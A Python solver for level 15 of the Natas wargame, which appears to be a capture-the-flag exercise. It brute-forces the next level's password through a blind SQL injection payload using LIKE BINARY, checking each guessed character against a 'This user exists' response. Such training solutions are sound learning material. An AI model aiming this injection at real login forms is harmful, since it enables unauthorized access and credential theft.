import re
from src.natas.base_level import NatasLevel
import string

class Level_15(NatasLevel):

  num = 15
  explanation = "On this level, a blind SQL injection uses LIKE BINARY to brute-force the password character by character.\n     We check whether each character is correct by looking for 'This user exists.' in the response."

  def exploit(self) -> str:

    CHARS  = string.ascii_letters + string.digits
    PASSWD = ""
    FOUND  = False

    while True:
      FOUND = False
      for i in range(len(CHARS)):
        char       = CHARS[i]
        payload    = {
          "username": f'natas16" AND password LIKE BINARY \'{PASSWD}{char}%\' -- -'
        }
        resp_chars = self.session.post(self.base_url + "/index.php", data = payload)
        if re.search(r'This user exists', resp_chars.text) != None:
          PASSWD = PASSWD + char
          FOUND    = True
          break
      if not FOUND:
        break

    return PASSWD
